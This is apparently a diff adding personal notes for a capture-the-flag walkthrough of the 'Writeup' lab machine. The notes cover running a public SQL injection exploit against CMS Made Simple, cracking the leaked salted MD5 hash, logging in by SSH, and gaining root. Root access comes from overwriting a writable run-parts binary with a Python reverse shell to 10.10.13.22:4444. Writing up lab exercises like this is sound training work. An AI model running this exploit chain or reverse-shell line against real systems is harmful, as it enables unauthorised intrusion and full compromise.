@@ -1,0 +1,49 @@
+﻿[Initial Enumeration]
+
+	===> Nmap reveals default ports 80 and 22
+		- Found http://10.10.10.138/writeup
+
+		- Using wappalyzer ===> The website was built using CMS made simple (has a known SQL Injection vuln)
+
+[Using the exploit 46635]
+
+	- python2 46635.py -u http://10.10.10.138/writeup/
+
+	Output:
+		[+] Salt for password found: 5a599ef579066807
+		[+] Username found: jkr
+		[+] Email found: jkr@writeup.htb
+		[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+
+[Cracking the Password]
+
+		- hash-identifier reveals ===> [+]  md5($pass.$salt)
+		- Using Hashcat ===> pw: raykayjay9
+
+==============================================================================
+	[user.txt] : ssh using jkr/pw combo and cat user.txt
+==============================================================================
+		
+==========================  [Priv. Esc. to Root]  ============================
+
+[Using pspy (live process monitoring tool)]
+		- Download from github
+		- Download into machine using python http server and wget
+
+		- Interesting output ===> "2019/09/04 12:33:17 CMD: UID=0    PID=11582  | run-parts --lsbsysinit /etc/update-motd.d 
+2019/09/04 12:33:17 CMD: UID=0    PID=11581  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new"
+		- Binary is writable!
+
+[Reverse shell into root (Important! check ip w/ "ip a s tun0")]
+
+	===> run-parts binary is autorun when login is performed! As such:
+
+		1 - reverse shell code into the binary ===> " echo “#!/bin/bash python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.13.22",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'” > /usr/local/sbin/run-parts "
+		2 - chmod file and set up listener
+		3 - (different window) login w/ "ssh jkr@10.10.10.138" + pw
+		4 - (former window) id ===> (Should be: root)
+
+==============================================================================
+			"cat root/root.txt" ===> pwned 
+==============================================================================
+
